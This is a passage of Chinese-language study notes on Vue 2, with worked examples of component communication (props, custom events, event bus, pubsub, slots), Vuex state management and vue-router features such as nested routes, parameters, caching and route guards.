- 使用 vue.config.js 可以对脚手架进行个性化定制，详情见：<https://cli.vuejs.org/zh>

## 2.2 基础知识

### 2.2.1 ref 属性

- 被用来给元素或子组件注册引用信息（id 的替代者）
- 应用在 html 标签上获取的是真实 DOM 元素，应用在组件标签上是组件实例对象（vc）
- 使用方式：
  - 打标识：`<h1 ref="xxx">.....</h1>`或 `<School ref="xxx"></School>`
  - 获取：`this.$refs.xxx`

> 具体案例

```html
<template>
  <div>
    <h1 v-text="msg" ref="title"></h1>
    <button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
    <School ref="sch" />
  </div>
</template>

<script>
  //引入School组件
  import School from "./components/School";

  export default {
    name: "App",
    components: { School },
    data() {
      return {
        msg: "欢迎学习Vue！",
      };
    },
    methods: {
      showDOM() {
        console.log(this.$refs.title); //真实DOM元素
        console.log(this.$refs.btn); //真实DOM元素
        console.log(this.$refs.sch); //School组件的实例对象（vc）
      },
    },
  };
</script>
```

### 2.2.2 props 配置项

1. 功能：让组件接收外部传过来的数据

2. 传递数据：`<Demo name="xxx"/>`

3. 接收数据：

   1. 第一种方式（只接收）：`props:['name']`

   2. 第二种方式（限制类型）：`props:{name:String}`

   3. 第三种方式（限制类型、限制必要性、指定默认值）：

      ```js
      props:{
       name:{
              type:String, //类型
              required:true, //必要性
              default:'老王' //默认值
       }
      }
      ```

   > 备注：props 是只读的，Vue 底层会监测你对 props 的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制 props 的内容到 data 中一份，然后去修改 data 中的数据。

示例代码：

父组件给子组件传数据

App.vue

```html
<template>
  <div id="app">
    <img alt="Vue logo" src="./assets/logo.png" />
    <Student></Student>
    <School name="haha" :age="this.age"></School>
  </div>
</template>

<script>
  import School from "./components/School.vue";
  import Student from "./components/Student.vue";

  export default {
    name: "App",
    data() {
      return {
        age: 360,
      };
    },
    components: {
      School,
      Student,
    },
  };
</script>

<style>
  #app {
    font-family: Avenir, Helvetica, Arial, sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    text-align: center;
    color: #2c3e50;
    margin-top: 60px;
  }
</style>
```

School.vue

```html
<template>
  <div class="demo">
    <h2>学校名称：{{ name }}</h2>
    <h2>学校年龄：{{ age }}</h2>
    <h2>学校地址：{{ address }}</h2>
    <button @click="showName">点我提示学校名</button>
  </div>
</template>

<script>
  export default {
    name: "School",
    // 最简单的写法：props: ['name', 'age']
    props: {
      name: {
        type: String,
        required: true, // 必须要传的
      },
      age: {
        type: Number,
        required: true,
      },
    },
    data() {
      return {
        address: "北京昌平",
      };
    },
    methods: {
      showName() {
        alert(this.name);
      },
    },
  };
</script>

<style>
  .demo {
    background-color: orange;
  }
</style>
```

### 2.2.3 mixin(混入)

混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。

例子：

```js
// 定义一个混入对象
var myMixin = {
  created: function () {
    this.hello();
  },
  methods: {
    hello: function () {
      console.log("hello from mixin!");
    },
  },
};

// 定义一个使用混入对象的组件
var Component = Vue.extend({
  mixins: [myMixin],
});
```

**选项合并**

当组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”。

比如，数据对象在内部会进行递归合并，并在发生冲突时以组件数据优先。

```js
var mixin = {
  data: function () {
    return {
      message: "hello",
      foo: "abc",
    };
  },
};

new Vue({
  mixins: [mixin],
  data: function () {
    return {
      message: "goodbye",
      bar: "def",
    };
  },
  created: function () {
    console.log(this.$data);
    // => { message: "goodbye", foo: "abc", bar: "def" }
  },
});
```

同名钩子函数将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子**之前**调用。

```js
var mixin = {
  created: function () {
    console.log("混入对象的钩子被调用");
  },
};

new Vue({
  mixins: [mixin],
  created: function () {
    console.log("组件钩子被调用");
  },
});

// => "混入对象的钩子被调用"
// => "组件钩子被调用"
```

值为对象的选项，例如 `methods`、`components` 和 `directives`，将被合并为同一个对象。两个对象键名冲突时，取组件对象的键值对。

```js
var mixin = {
  methods: {
    foo: function () {
      console.log("foo");
    },
    conflicting: function () {
      console.log("from mixin");
    },
  },
};

var vm = new Vue({
  mixins: [mixin],
  methods: {
    bar: function () {
      console.log("bar");
    },
    conflicting: function () {
      console.log("from self");
    },
  },
});

vm.foo(); // => "foo"
vm.bar(); // => "bar"
vm.conflicting(); // => "from self"
```

> 全局混入不建议使用

### 2.2.4 插件

插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制。

通过全局方法 `Vue.use()` 使用插件。它需要在你调用 `new Vue()` 启动应用之前完成：

```js
// 调用 `MyPlugin.install(Vue)`
Vue.use(MyPlugin);

new Vue({
  // ...组件选项
});
```

本质：包含 install 方法的一个对象，install 的第一个参数是 Vue，第二个以后的参数是插件使用者传递的数据。

定义插件：

```js
对象.install = function (Vue, options) {
    // 1. 添加全局过滤器
    Vue.filter(....)

    // 2. 添加全局指令
    Vue.directive(....)

    // 3. 配置全局混入(合)
    Vue.mixin(....)

    // 4. 添加实例方法
    Vue.prototype.$myMethod = function () {...}
    Vue.prototype.$myProperty = xxxx
}
```

具体案例：

plugin.js

```js
export default {
  install(Vue, x, y, z) {
    console.log(x, y, z);
    //全局过滤器
    Vue.filter("mySlice", function (value) {
      return value.slice(0, 4);
    });

    //定义全局指令
    Vue.directive("fbind", {
      //指令与元素成功绑定时（一上来）
      bind(element, binding) {
        element.value = binding.value;
      },
      //指令所在元素被插入页面时
      inserted(element, binding) {
        element.focus();
      },
      //指令所在的模板被重新解析时
      update(element, binding) {
        element.value = binding.value;
      },
    });

    //定义混入
    Vue.mixin({
      data() {
        return {
          x: 100,
          y: 200,
        };
      },
    });

    //给Vue原型上添加一个方法（vm和vc就都能用了）
    Vue.prototype.hello = () => {
      alert("你好啊aaaa");
    };
  },
};
```

main.js

```js
// 引入插件
import plugin from "./plugin";

// 使用插件
Vue.use(plugin);
```

然后就可以在别的组件使用插件里的功能了。

### 2.2.5 scoped 样式

1. 作用：让样式在局部生效，防止冲突。
2. 写法：`<style scoped>`

具体案例：

```vue
<style lang="less" scoped>
.demo {
  background-color: pink;
  .atguigu {
    font-size: 40px;
  }
}
</style>
```

## 2.3 组件自定义事件

组件自定义事件是一种组件间通信的方式，适用于：子组件 ===> 父组件

**使用场景**

A 是父组件，B 是子组件，B 想给 A 传数据，那么就要在 A 中给 B 绑定自定义事件的回调在 A 中。

**绑定自定义事件：**

第一种方式，在父组件中：`<Demo @atguigu="test"/>`或 `<Demo v-on:atguigu="test"/>`

> 具体代码

App.vue

```html
<template>
  <div class="app">
    <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第一种写法，使用@或v-on） -->
    <Student @atguigu="getStudentName" />
  </div>
</template>

<script>
  import Student from "./components/Student";

  export default {
    name: "App",
    components: { Student },
    data() {
      return {
        msg: "你好啊！",
        studentName: "",
      };
    },
    methods: {
      getStudentName(name, ...params) {
        console.log("App收到了学生名：", name, params);
        this.studentName = name;
      },
    },
  };
</script>
```

Student.vue

```html
<template>
  <div class="student">
    <button @click="sendStudentlName">把学生名给App</button>
  </div>
</template>

<script>
  export default {
    name: "Student",
    data() {
      return {
        name: "张三",
      };
    },
    methods: {
      sendStudentlName() {
        //触发Student组件实例身上的atguigu事件
        this.$emit("atguigu", this.name, 666, 888, 900);
      },
    },
  };
</script>
```

第二种方式，在父组件中：

使用 `this.$refs.xxx.$on()` 这样写起来更灵活，比如可以加定时器啥的。

> 具体代码

App.vue

```html
<template>
  <div class="app">
    <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） -->
    <Student ref="student" />
  </div>
</template>

<script>
  import Student from "./components/Student";

  export default {
    name: "App",
    components: { Student },
    data() {
      return {
        studentName: "",
      };
    },
    methods: {
      getStudentName(name, ...params) {
        console.log("App收到了学生名：", name, params);
        this.studentName = name;
      },
    },
    mounted() {
      this.$refs.student.$on("atguigu", this.getStudentName); //绑定自定义事件
      // this.$refs.student.$once('atguigu',this.getStudentName) //绑定自定义事件（一次性）
    },
  };
</script>
```

Student.vue

```html
<template>
  <div class="student">
    <button @click="sendStudentlName">把学生名给App</button>
  </div>
</template>

<script>
  export default {
    name: "Student",
    data() {
      return {
        name: "张三",
      };
    },
    methods: {
      sendStudentlName() {
        //触发Student组件实例身上的atguigu事件
        this.$emit("atguigu", this.name, 666, 888, 900);
      },
    },
  };
</script>
```

> 若想让自定义事件只能触发一次，可以使用`once`修饰符，或`$once`方法。
> 触发自定义事件：`this.$emit('atguigu',数据)`  
> 使用 this.$emit() 就可以子组件向父组件传数据

解绑自定义事件：`this.$off('atguigu')`

> 代码

```js
this.$off("atguigu"); //解绑一个自定义事件
// this.$off(['atguigu','demo']) //解绑多个自定义事件
// this.$off() //解绑所有的自定义事件
```

**组件上也可以绑定原生 DOM 事件，需要使用`native`修饰符。**

> 代码

```vue
<!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） -->
<Student ref="student" @click.native="show" />
```

> 注意：通过`this.$refs.xxx.$on('atguigu',回调)`绑定自定义事件时，回调要么配置在 methods 中，要么用箭头函数，否则 this 指向会出问题！

## 2.4 全局事件总线

1. 一种组件间通信的方式，适用于任意组件间通信。

2. 安装全局事件总线：

   ```js
   new Vue({
    ......
    beforeCreate() {
     Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
    },
       ......
   })
   ```

3. 使用事件总线：

   1. 接收数据：A 组件想接收数据，则在 A 组件中给$bus 绑定自定义事件，事件的回调留在 A 组件自身。

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.$bus.$on('xxxx',this.demo)
      }
      ```

   2. 提供数据：`this.$bus.$emit('xxxx',数据)`

4. 最好在 beforeDestroy 钩子中，用$off 去解绑当前组件所用到的事件。

   ```vue
   beforeDestroy() { this.$bus.$off('hello') },
   ```

## 2.5 消息订阅与发布 pubsub

1. 一种组件间通信的方式，适用于任意组件间通信。

2. 使用步骤：

   1. 安装 pubsub：`npm i pubsub-js`

   2. 引入: `import pubsub from 'pubsub-js'`

   3. 接收数据：A 组件想接收数据，则在 A 组件中订阅消息，订阅的回调留在 A 组件自身。

      ```js
      methods:{
        demo(data){......}
      }
      ......
      mounted() {
        this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
      }
      ```

   4. 提供数据：`pubsub.publish('xxx',数据)`

   5. 最好在 beforeDestroy 钩子中，用`PubSub.unsubscribe(pid)`去取消订阅。

## 2.6 nextTick

1. 语法：`this.$nextTick(回调函数)`
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新 DOM 进行某些操作时，要在 nextTick 所指定的回调函数中执行。

具体案例

```js
this.$nextTick(function () {
  this.$refs.inputTitle.focus();
});
```

## 2.7 slot 插槽

1. 作用：让父组件可以向子组件指定位置插入 html 结构，也是一种组件间通信的方式，适用于 父组件 ===> 子组件 。

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式：

   1. 默认插槽：

      ```html
      父组件中：
      <Category>
        <div>html结构1</div>
      </Category>
      子组件中：
      <template>
        <div>
          <!-- 定义插槽 -->
          <slot>插槽默认内容...</slot>
        </div>
      </template>
      ```

   2. 具名插槽：

      ```html
      父组件中：
      <Category>
        <template slot="center">
          <div>html结构1</div>
        </template>

        <template v-slot:footer>
          <div>html结构2</div>
        </template>
      </Category>
      子组件中：
      <template>
        <div>
          <!-- 定义插槽 -->
          <slot name="center">插槽默认内容...</slot>
          <slot name="footer">插槽默认内容...</slot>
        </div>
      </template>
      ```

   3. 作用域插槽：

      1. 理解：数据在组件的自身（子组件），但根据数据生成的结构需要组件的使用者（父组件）来决定。（games 数据在 Category（子）组件中，但使用数据所遍历出来的结构由 App（父）组件决定）

      2. 具体编码：
         父组件中：

      ```vue
      <Category>
          <template scope="scopeData">
           <!-- 生成的是ul列表 -->
           <ul>
            <li v-for="g in scopeData.games" :key="g">{{g}}</li>
           </ul>
          </template>
         </Category>

      <Category>
          <template slot-scope="scopeData">
           <!-- 生成的是h4标题 -->
           <h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
          </template>
         </Category>
      ```

      子组件中

      ```vue
      <template>
        <div>
          <!-- 通过数据绑定就可以把子组件的数据传到父组件 -->
          <slot :games="games"></slot>
        </div>
      </template>

      <script>
      export default {
        name: "Category",
        props: ["title"],
        //数据在子组件自身
        data() {
          return {
            games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
          };
        },
      };
      </script>
      ```

## 2.8 配置代理

可以用来解决跨域的问题

> ajax 是前端技术，你得有浏览器，才有 window 对象，才有 xhr，才能发 ajax 请求，服务器之间通信就用传统的 http 请求就行了。

### 方法一

​ 在 vue.config.js 中添加如下配置：

```js
devServer: {
  proxy: "http://localhost:5000";
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

### 方法二

​ 编写 vue.config.js 配置具体代理规则：

```js
module.exports = {
  devServer: {
    proxy: {
      "/api1": {
        // 匹配所有以 '/api1'开头的请求路径
        target: "http://localhost:5000", // 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: { "^/api1": "" }, //代理服务器将请求地址转给真实服务器时会将 /api1 去掉
      },
      "/api2": {
        // 匹配所有以 '/api2'开头的请求路径
        target: "http://localhost:5001", // 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: { "^/api2": "" },
      },
    },
  },
};
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。

# 3. 插件

## 3.1 VUEX

这是在 Vue 中实现集中式状态（数据）管理的一个官方插件，对 vue 应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。
原理图
![img](https://raw.githubusercontent.com/pleb631/ImgManager/main/img/vuex原理图.jpg)

## 3.2 搭建 vuex 环境

1. 创建文件：`src/store/index.js`

   ```js
   //引入Vue核心库
   import Vue from "vue";
   //引入Vuex
   import Vuex from "vuex";
   //应用Vuex插件
   Vue.use(Vuex);

   //准备actions对象——响应组件中用户的动作
   const actions = {};
   //准备mutations对象——修改state中的数据
   const mutations = {};
   //准备state对象——保存具体的数据
   const state = {};

   //创建并暴露store
   export default new Vuex.Store({
     actions,
     mutations,
     state,
   });
   ```

2. 在`main.js`中创建 vm 时传入`store`配置项

   ```js
   ......
   //引入store
   import store from './store'
   ......

   //创建vm
   new Vue({
    el:'#app',
    render: h => h(App),
    store
   })
   ```

## 3.3 基本使用

1. 初始化数据、配置`actions`、配置`mutations`，操作文件`store.js`

   ```js
   //引入Vue核心库
   import Vue from "vue";
   //引入Vuex
   import Vuex from "vuex";
   //引用Vuex
   Vue.use(Vuex);

   const actions = {
     //响应组件中加的动作
     jia(context, value) {
       // console.log('actions中的jia被调用了',miniStore,value)
       context.commit("JIA", value);
     },
   };

   const mutations = {
     //执行加
     JIA(state, value) {
       // console.log('mutations中的JIA被调用了',state,value)
       state.sum += value;
     },
   };

   //初始化数据
   const state = {
     sum: 0,
   };

   //创建并暴露store
   export default new Vuex.Store({
     actions,
     mutations,
     state,
   });
   ```

2. 组件中读取 vuex 中的数据：`$store.state.sum`

3. 组件中修改 vuex 中的数据：`$store.dispatch('action中的方法名',数据)`或 `$store.commit('mutations中的方法名',数据)`

   > 备注：若没有网络请求或其他业务逻辑，组件中也可以越过 actions，即不写`dispatch`，直接编写`commit`

具体案例：

index.js

```js
//该文件用于创建Vuex中最为核心的store
import Vue from "vue";
//引入Vuex
import Vuex from "vuex";
//应用Vuex插件
Vue.use(Vuex);

//准备actions——用于响应组件中的动作
const actions = {
  /* jia(context,value){
  console.log('actions中的jia被调用了')
  context.commit('JIA',value)
 },
 jian(context,value){
  console.log('actions中的jian被调用了')
  context.commit('JIAN',value)
 }, */
  jiaOdd(context, value) {
    console.log("actions中的jiaOdd被调用了");
    if (context.state.sum % 2) {
      context.commit("JIA", value);
    }
  },
  jiaWait(context, value) {
    console.log("actions中的jiaWait被调用了");
    setTimeout(() => {
      context.commit("JIA", value);
    }, 500);
  },
};
//准备mutations——用于操作数据（state）
const mutations = {
  JIA(state, value) {
    console.log("mutations中的JIA被调用了");
    state.sum += value;
  },
  JIAN(state, value) {
    console.log("mutations中的JIAN被调用了");
    state.sum -= value;
  },
};
//准备state——用于存储数据
const state = {
  sum: 0, //当前的和
};

//创建并暴露store
export default new Vuex.Store({
  actions,
  mutations,
  state,
});
```

Count.vue

```html
<template>
  <div>
    <h1>当前求和为：{{$store.state.sum}}</h1>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
  export default {
    name: "Count",
    data() {
      return {
        n: 1, //用户选择的数字
      };
    },
    methods: {
      increment() {
        // commit 是操作 mutations
        this.$store.commit("JIA", this.n);
      },
      decrement() {
        // commit 是操作 mutations
        this.$store.commit("JIAN", this.n);
      },
      incrementOdd() {
        // dispatch 是操作 actions
        this.$store.dispatch("jiaOdd", this.n);
      },
      incrementWait() {
        // dispatch 是操作 actions
        this.$store.dispatch("jiaWait", this.n);
      },
    },
    mounted() {
      console.log("Count", this);
    },
  };
</script>

<style lang="css">
  button {
    margin-left: 5px;
  }
</style>
```

## 3.4 getters 的使用

1. 概念：当 state 中的数据需要经过加工后再使用时，可以使用 getters 加工。

2. 在`store.js`中追加`getters`配置

   ```js
   ......

   const getters = {
    bigSum(state){
     return state.sum * 10
    }
   }

   //创建并暴露store
   export default new Vuex.Store({
    ......
    getters
   })
   ```

3. 组件中读取数据：`$store.getters.bigSum`

## 3.5 四个 map 方法的使用

导入

```js
import { mapState, mapGetters, mapActions, mapMutations } from "vuex";
```

1. mapState：用于帮助我们映射`state`中的数据为计算属性

   ```js
   computed: {
       //借助mapState生成计算属性：sum、school、subject（对象写法）
        ...mapState({sum:'sum',school:'school',subject:'subject'}),

       //借助mapState生成计算属性：sum、school、subject（数组写法）
       ...mapState(['sum','school','subject']),
   },
   ```

2. mapGetters 方法：用于帮助我们映射`getters`中的数据为计算属性

   ```js
   computed: {
       //借助mapGetters生成计算属性：bigSum（对象写法）
       ...mapGetters({bigSum:'bigSum'}),

       //借助mapGetters生成计算属性：bigSum（数组写法）
       ...mapGetters(['bigSum'])
   },
   ```

3. mapActions 方法：用于帮助我们生成与`actions`对话的方法，即：包含`$store.dispatch(xxx)`的函数

   ```js
   methods:{
       //靠mapActions生成：incrementOdd、incrementWait（对象形式）
       ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})

       //靠mapActions生成：incrementOdd、incrementWait（数组形式）
       ...mapActions(['jiaOdd','jiaWait'])
   }
   ```

4. mapMutations 方法：用于帮助我们生成与`mutations`对话的方法，即：包含`$store.commit(xxx)`的函数

   ```js
   methods:{
       //靠mapActions生成：increment、decrement（对象形式）
       ...mapMutations({increment:'JIA',decrement:'JIAN'}),

       //靠mapMutations生成：JIA、JIAN（对象形式）
       ...mapMutations(['JIA','JIAN']),
   }
   ```

> 备注：mapActions 与 mapMutations 使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则传的参数是事件对象(event)。

具体案例：

```html
<template>
  <div>
    <h1>当前求和为：{{ sum }}</h1>
    <h3>当前求和放大10倍为：{{ bigSum }}</h3>
    <h3>年龄：{{ age }}</h3>
    <h3>姓名：{{name}}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <!-- 用了mapActions 和 mapMutations 的话要主动传参 -->
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
  import { mapState, mapGetters, mapActions, mapMutations } from "vuex";
  export default {
    name: "Count",
    data() {
      return {
        n: 1, //用户选择的数字
      };
    },
    computed: {
      ...mapState(["sum", "age", "name"]),
      ...mapGetters(["bigSum"]),
    },
    methods: {
      ...mapActions({ incrementOdd: "sumOdd", incrementWait: "sumWait" }),
      ...mapMutations({ increment: "sum", decrement: "reduce" }),
    },
    mounted() {
      console.log("Count", this);
    },
  };
</script>

<style lang="css">
  button {
    margin-left: 5px;
  }
</style>
```

## 3.6 模块化+命名空间

1. 目的：让代码更好维护，让多种数据分类更加明确。

2. 修改`store.js`

   ```javascript
   const countAbout = {
     namespaced:true,//开启命名空间
     state:{x:1},
     mutations: { ... },
     actions: { ... },
     getters: {
       bigSum(state){
          return state.sum * 10
       }
     }
   }

   const personAbout = {
     namespaced:true,//开启命名空间
     state:{ ... },
     mutations: { ... },
     actions: { ... }
   }

   const store = new Vuex.Store({
     modules: {
       countAbout,
       personAbout
     }
   })
   ```

3. 开启命名空间后，组件中读取 state 数据：

   ```js
   //方式一：自己直接读取
   this.$store.state.personAbout.list
   //方式二：借助mapState读取：
   // 用 mapState 取 countAbout 中的state 必须加上 'countAbout'
   ...mapState('countAbout',['sum','school','subject']),
   ```

4. 开启命名空间后，组件中读取 getters 数据：

   ```js
   //方式一：自己直接读取
   this.$store.getters['personAbout/firstPersonName']
   //方式二：借助mapGetters读取：
   ...mapGetters('countAbout',['bigSum'])
   ```

5. 开启命名空间后，组件中调用 dispatch

   ```js
   //方式一：自己直接dispatch
   this.$store.dispatch('personAbout/addPersonWang',person)
   //方式二：借助mapActions：
   ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   ```

6. 开启命名空间后，组件中调用 commit

   ```js
   //方式一：自己直接commit
   this.$store.commit('personAbout/ADD_PERSON',person)
   //方式二：借助mapMutations：
   ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
   ```

# 4. 路由

1. 理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。
2. 前端路由：key 是路径，value 是组件。

## 4.1 基本使用

1. 安装 vue-router，命令：`npm i vue-router`

2. 应用插件：`Vue.use(VueRouter)`

3. 编写 router 配置项:

   ```js
   //引入VueRouter
   import VueRouter from "vue-router";
   //引入Luyou 组件
   import About from "../components/About";
   import Home from "../components/Home";

   //创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
     routes: [
       {
         path: "/about",
         component: About,
       },
       {
         path: "/home",
         component: Home,
       },
     ],
   });

   //暴露router
   export default router;
   ```

4. 实现切换（active-class 可配置高亮样式）

   ```html
   <router-link active-class="active" to="/about">About</router-link>
   ```

5. 指定展示位置

   ```html
   <router-view></router-view>
   ```

## 4.2 几个注意点

1. 路由组件通常存放在`pages`文件夹，一般组件通常存放在`components`文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的`$route`属性，里面存储着自己的路由信息。
4. 整个应用只有一个 router，可以通过组件的`$router`属性获取到。

## 4.3 多级路由（多级路由）

1. 配置路由规则，使用 children 配置项：

   ```js
   routes: [
     {
       path: "/about",
       component: About,
     },
     {
       path: "/home",
       component: Home,
       children: [
         //通过children配置子级路由
         {
           path: "news", //此处一定不要写：/news
           component: News,
         },
         {
           path: "message", //此处一定不要写：/message
           component: Message,
         },
       ],
     },
   ];
   ```

2. 跳转（要写完整路径）：

   ```html
   <router-link to="/home/news">News</router-link>
   ```

3. 指定展示位置

   ```html
   <router-view></router-view>
   ```

## 4.4 路由的 query 参数

1. 传递参数

   ```html
   <!-- 跳转并携带query参数，to的字符串写法 -->
   <router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>

   <!-- 跳转并携带query参数，to的对象写法 -->
   <router-link
     :to="{
     path:'/home/message/detail',
     query:{
        id:666,
               title:'你好'
     }
    }"
     >跳转</router-link
   >
   ```

2. 接收参数：

   ```html
   $route.query.id $route.query.title
   ```

## 4.5 命名路由

1. 作用：可以简化路由的跳转。

2. 如何使用

   1. 给路由命名：

      ```js
      {
       path:'/demo',
       component:Demo,
       children:[
        {
         path:'test',
         component:Test,
         children:[
          {
                            name:'hello' //给路由命名
           path:'welcome',
           component:Hello,
          }
         ]
        }
       ]
      }
      ```

   2. 简化跳转：

      ```html
      <!--简化前，需要写完整的路径 -->
      <router-link to="/demo/test/welcome">跳转</router-link>

      <!--简化后，直接通过名字跳转 -->
      <router-link :to="{name:'hello'}">跳转</router-link>

      <!--简化写法配合传递参数 -->
      <router-link
        :to="{
        name:'hello',
        query:{
           id:666,
                  title:'你好'
        }
       }"
        >跳转</router-link
      >
      ```

## 4.6 路由的 params 参数

1. 配置路由，声明接收 params 参数

   ```js
   {
    path:'/home',
    component:Home,
    children:[
     {
      path:'news',
      component:News
     },
     {
      component:Message,
      children:[
       {
        name:'xiangqing',
        path:'detail/:id/:title', //使用占位符声明接收params参数
        component:Detail
       }
      ]
     }
    ]
   }
   ```

2. 传递参数

   ```html
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>

   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link
     :to="{
     name:'xiangqing',
     params:{
        id:666,
        title:'你好'
     }
    }"
     >跳转</router-link
   >
   ```

   > 特别注意：路由携带 params 参数时，若使用 to 的对象写法，则不能使用 path 配置项，必须使用 name 配置！

3. 接收参数：

   ```js
   $route.params.id;
   $route.params.title;
   ```

## 4.7 路由的 props 配置

作用：让路由组件更方便的收到参数

```js
{
 name:'xiangqing',
 path:'detail/:id',
 component:Detail,

 //第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件 //没用
 // props:{a:900}

 //第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
 // props:true

 //第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
 props($route) {
  return {
    id: $route.query.id,
    title:$route.query.title,
    a: 1,
    b: 'hello'
  }
 }
}
```

> 方便在要跳转去的组件里更简便的写法

跳转去组件的具体代码

```html
<template>
  <ul>
    <h1>Detail</h1>
    <li>消息编号：{{id}}</li>
    <li>消息标题：{{title}}</li>
    <li>a:{{a}}</li>
    <li>b:{{b}}</li>
  </ul>
</template>

<script>
  export default {
    name: "Detail",
    props: ["id", "title", "a", "b"],
    mounted() {
      console.log(this.$route);
    },
  };
</script>

<style></style>
```

## 4.8 replace 属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为`push`和`replace`，`push`是追加历史记录，`replace`是替换当前记录。路由跳转时候默认为`push`
3. 如何开启`replace`模式：`<router-link replace .......>News</router-link>`

## 4.9 编程式路由导航

1. 作用：不借助`<router-link>`实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```js
   //$router的两个API
   this.$router.push({
     name: "xiangqing",
     params: {
       id: xxx,
       title: xxx,
     },
   });

   this.$router.replace({
     name: "xiangqing",
     params: {
       id: xxx,
       title: xxx,
     },
   });
   this.$router.forward(); //前进
   this.$router.back(); //后退
   this.$router.go(); //可前进也可后退
   ```

## 4.10 缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

   这个 include 指的是组件名

   ```html
   <keep-alive include="News">
     <router-view></router-view>
   </keep-alive>
   ```

## 4.11 两个新的生命周期钩子

作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
具体名字：

- `activated`路由组件被激活时触发。
- `deactivated`路由组件失活时触发。

```vue
<template>
  <ul>
    <li :style="{ opacity }">欢迎学习vue</li>
    <li>news001 <input type="text" /></li>
    <li>news002 <input type="text" /></li>
    <li>news003 <input type="text" /></li>
  </ul>
</template>

<script>
export default {
  name: "News",
  data() {
    return {
      opacity: 1,
    };
  },
  // mounted() {
  //   this.timer = setInterval(() => {
  //     console.log('@')
  //     this.opacity -= 0.01;
  //     if(this.opacity <= 0) this.opacity = 1;
  //   },16);
  // },
  //
  // beforeDestroy() {
  //   console.log('News组件将要被销毁');
  //   clearInterval(this.timer);
  // },

  //激活(路由组件独有的两个钩子)
  activated() {
    console.log("News组件被激活");
    this.timer = setInterval(() => {
      console.log("@");
      this.opacity -= 0.01;
      if (this.opacity <= 0) this.opacity = 1;
    }, 16);
  },
  //失活
  deactivated() {
    console.log("News组件失活了");
    clearInterval(this.timer);
  },
};
</script>
```

> 这两个生命周期钩子需要配合前面的缓存路由组件使用（没有缓存路由组件不起效果）

## 4.12 路由守卫

1. 作用：对路由进行权限控制

2. 分类：全局守卫、独享守卫、组件内守卫

3. 全局守卫:

   ```js
   //全局前置守卫：初始化时执行、每次路由切换前执行
   router.beforeEach((to, from, next) => {
     console.log("beforeEach", to, from);
     if (to.meta.isAuth) {
       //判断当前路由是否需要进行权限控制
       if (localStorage.getItem("school") === "zhejiang") {
         //权限控制的具体规则
         next(); //放行
       } else {
         alert("暂无权限查看");
         // next({name:'guanyu'})
       }
     } else {
       next(); //放行
     }
   });

   //全局后置守卫：初始化时执行、每次路由切换后执行
   router.afterEach((to, from) => {
     console.log("afterEach", to, from);
     if (to.meta.title) {
       document.title = to.meta.title; //修改网页的title
     } else {
       document.title = "vue_test";
     }
   });
   ```

   完整代码

```js
// 这个文件专门用于创建整个应用的路由器
import VueRouter from "vue-router";
// 引入组件
import About from "../pages/About.vue";
